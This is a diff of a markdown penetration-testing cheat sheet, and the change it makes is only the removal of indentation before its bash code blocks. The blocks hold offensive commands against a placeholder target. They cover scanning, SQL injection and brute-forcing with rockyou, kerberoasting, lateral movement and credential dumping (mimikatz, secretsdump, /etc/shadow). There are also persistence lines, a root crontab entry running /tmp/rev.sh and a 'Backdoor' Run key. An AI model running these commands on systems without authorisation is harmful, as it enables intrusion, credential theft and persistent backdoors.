@@ -22,38 +22,38 @@ whois target.com
 
 ### Active Recon (Directly interacts with target)
 - **nmap**: Finds open ports, services, versions, and OS.
-  ```bash
+```bash
 nmap -sC -sV -A -T4 target.com
 nmap -p- target.com  # Scan all ports
 nmap --script vuln target.com  # Vulnerability scan
 ```
 - **rustscan**: Fast port scan.
-  ```bash
+```bash
 rustscan -a target.com -- -sV -O
 ```
 - **masscan**: Super fast port scanner.
-  ```bash
+```bash
 masscan -p1-65535 target.com --rate=10000
 ```
 - **dig/nslookup/host**: DNS queries.
-  ```bash
+```bash
 dig target.com
 nslookup target.com
 host target.com
 ```
 - **Subdomain Enumeration**
-  ```bash
+```bash
 dnsenum target.com
 subfinder -d target.com
 amass enum -d target.com
 assetfinder --subs-only target.com
 ```
 - **Zone Transfer**
-  ```bash
+```bash
 dig axfr @ns1.target.com target.com
 ```
 - **Banner Grabbing**
-  ```bash
+```bash
 nc -nv target.com 80
 telnet target.com 80
 ```
@@ -73,7 +73,7 @@ telnet target.com 80
 **Goal:** Find vulnerabilities in web apps (directories, files, SQLi, XSS, etc.).
 
 - **Directory Brute-Forcing**
-  ```bash
+```bash
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://target.com/FUZZ
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://target.com/FUZZ
@@ -81,28 +81,28 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http:/
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 ```
 - **Parameter Discovery**
-  ```bash
+```bash
 arjun -u http://target.com/page
 paramspider -d target.com
 ```
 - **SQL Injection**
-  ```bash
+```bash
 sqlmap -u "http://target.com/page?id=1" --dbs
 sqlmap -r request.txt --batch --risk=3 --level=5
 ```
 - **XSS Testing**
-  ```bash
+```bash
 dalfox url http://target.com
 xsstrike -u http://target.com
 ```
 - **Vulnerability Scanning**
-  ```bash
+```bash
 nikto -h http://target.com
 wpscan --url http://target.com --enumerate u,p
 nuclei -u http://target.com
 ```
 - **Web Crawling**
-  ```bash
+```bash
 gospider -s http://target.com
 hakrawler -url http://target.com
 ```
@@ -126,32 +126,32 @@ hakrawler -url http://target.com
 **Goal:** Attack network services (SMB, FTP, SNMP, RDP, SSH, etc.).
 
 - **SMB Enumeration**
-  ```bash
+```bash
 enum4linux -a target.com
 smbclient -L //target.com/
 crackmapexec smb target.com -u user -p /usr/share/wordlists/rockyou.txt
 ```
 - **FTP Brute Force**
-  ```bash
+```bash
 hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com
 medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ftp
 ```
 - **SSH Brute Force**
-  ```bash
+```bash
 hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
 medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ssh
 ```
 - **SNMP Enumeration**
-  ```bash
+```bash
 snmpwalk -v2c -c public target.com
 ```
 - **RDP Brute Force**
-  ```bash
+```bash
 hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com
 xfreerdp /u:user /p:pass /v:target.com
 ```
 - **Traffic Sniffing**
-  ```bash
+```bash
 tcpdump -i eth0 -w capture.pcap
 wireshark
 mitmproxy -m transparent
@@ -172,26 +172,26 @@ mitmproxy -m transparent
 **Goal:** Enumerate and attack AD environments (BloodHound, kerberoasting, AS-REP roasting, etc.).
 
 - **BloodHound Collection**
-  ```bash
+```bash
 neo4j console & bloodhound &  # Start services
 SharpHound.exe -c all         # Collect data on Windows
 ```
 - **Kerberoasting**
-  ```bash
+```bash
 GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x
 ```
 - **AS-REP Roasting**
-  ```bash
+```bash
 GetNPUsers.py domain/ -usersfile users.txt -no-pass
 ```
 - **Windows Enumeration**
-  ```bash
+```bash
 net user /domain
 net group "Domain Admins" /domain
 dsquery * -limit 100
 ```
 - **Lateral Movement**
-  ```bash
+```bash
 PsExec.exe \\target.com -u user -p pass cmd
 wmiexec.py domain/user:pass@target.com
 ```
@@ -211,29 +211,29 @@ wmiexec.py domain/user:pass@target.com
 **Goal:** Get a shell and escalate privileges to root/Administrator. Dump credentials, establish persistence, and recon again.
 
 - **Linux Privilege Escalation**
-  ```bash
+```bash
 ./linpeas.sh > linpeas_out.txt
 find / -perm -4000 2>/dev/null
 crontab -l
 ```
 - **Windows Privilege Escalation**
-  ```bash
+```bash
 winPEAS.exe > winpeas_out.txt
 ```
 - **Credential Dumping**
-  ```bash
+```bash
 mimikatz
 secretsdump.py -just-dc-user domain/user:pass@dc-ip
 samdump2
 cat /etc/shadow
 ```
 - **Persistence**
-  ```bash
+```bash
 echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
 ```
 - **Host Recon**
-  ```bash
+```bash
 whoami
 hostname
 ipconfig /all
